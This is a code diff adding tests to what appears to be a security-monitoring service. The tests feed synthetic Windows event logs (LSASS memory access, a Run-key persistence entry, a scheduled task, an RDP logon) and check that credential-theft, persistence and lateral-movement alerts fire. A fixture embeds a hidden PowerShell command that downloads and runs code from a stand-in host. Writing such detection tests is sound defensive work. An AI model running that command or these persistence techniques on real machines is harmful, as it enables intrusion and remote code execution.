@@ -200,3 +200,50 @@ def test_local_admin_group_add_matches_created_account(api_for) -> None:
     body = _post(admin, key, "windows-event", records)
     assert body.status_code == 200 and body.json()["alerts_created"] == 1
     assert any(a["rule_id"] == "SF-IAM-001" for a in _alerts(admin))
+
+
+TASK_XML = (
+    '<?xml version="1.0" encoding="UTF-16"?><Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
+    '<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -nop -c iex(iwr http://cdn-update.test/a)</Arguments></Exec></Actions></Task>'
+)
+
+
+def test_windows_persistence_credential_and_rdp_events(api_for) -> None:
+    admin = api_for("admin")
+    key = create_source(admin, "FIN-WS-014 Security and Sysmon")
+    sysmon = "Microsoft-Windows-Sysmon/Operational"
+    records = [
+        {"EventID": 10, "TimeCreated": _at(1), "Computer": "FIN-WS-014", "Channel": sysmon,
+         "EventData": {"SourceImage": "C:\\Users\\Public\\m.exe", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1010", "SourceUser": "CORP\\b.chen"}},
+        {"EventID": 13, "TimeCreated": _at(2), "Computer": "FIN-WS-014", "Channel": sysmon,
+         "EventData": {"EventType": "SetValue", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "CORP\\b.chen",
+                       "TargetObject": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+                       "Details": "C:\\Users\\b.chen\\AppData\\Local\\Temp\\upd.exe"}},
+        {"EventID": 4698, "TimeCreated": _at(3), "Computer": "FIN-WS-014", "LogName": "Security",
+         "EventData": {"SubjectUserName": "b.chen", "SubjectDomainName": "CORP", "TaskName": "\\EdgeUpdateCore", "TaskContent": TASK_XML}},
+        {"EventID": 4624, "TimeCreated": _at(4), "Computer": "FIN-WS-014", "LogName": "Security",
+         "EventData": {"TargetUserName": "b.chen", "TargetDomainName": "CORP", "IpAddress": "198.51.100.40", "LogonType": "10"}},
+        # Sysmon event types the detections do not use are skipped, not guessed at.
+        {"EventID": 5, "TimeCreated": _at(5), "Computer": "FIN-WS-014", "Channel": sysmon, "EventData": {"Image": "C:\\x.exe"}},
+    ]  # fmt: skip
+    body = _post(admin, key, "windows-event", records).json()
+    assert body["inserted"] == 4 and body["skipped"] == 1, body
+    rules = {a["rule_id"] for a in _alerts(admin)}
+    assert {"SF-CRED-001", "SF-PERS-001", "SF-PERS-002", "SF-LAT-001"} <= rules
+
+
+def test_windows_mapping_of_new_event_ids() -> None:
+    escaped = TASK_XML.replace("<", "&lt;").replace(">", "&gt;")
+    rows = [
+        # Log Analytics SecurityEvent: TaskContent arrives escaped inside the EventData XML.
+        {"TimeGenerated": _at(1), "Computer": "FIN-WS-014", "EventID": 4698,
+         "EventData": f'<EventData><Data Name="TaskName">\\EdgeUpdateCore</Data><Data Name="TaskContent">{escaped}</Data></EventData>'},
+        {"TimeGenerated": _at(2), "Computer": "WEB-01", "EventID": 4624, "EventData": {"TargetUserName": "svc_web", "IpAddress": "198.51.100.40", "LogonType": "3"}},
+    ]  # fmt: skip
+    events, skipped = map_records("windows-event", rows)
+    assert skipped == 0
+    task, logon = events
+    assert task.event_type == "task.created" and task.process_name == "powershell.exe"
+    assert task.command_line == "powershell.exe -w hidden -nop -c iex(iwr http://cdn-update.test/a)"
+    assert task.raw["task_name"] == "\\EdgeUpdateCore"
+    assert logon.raw["logon_type"] == "3"
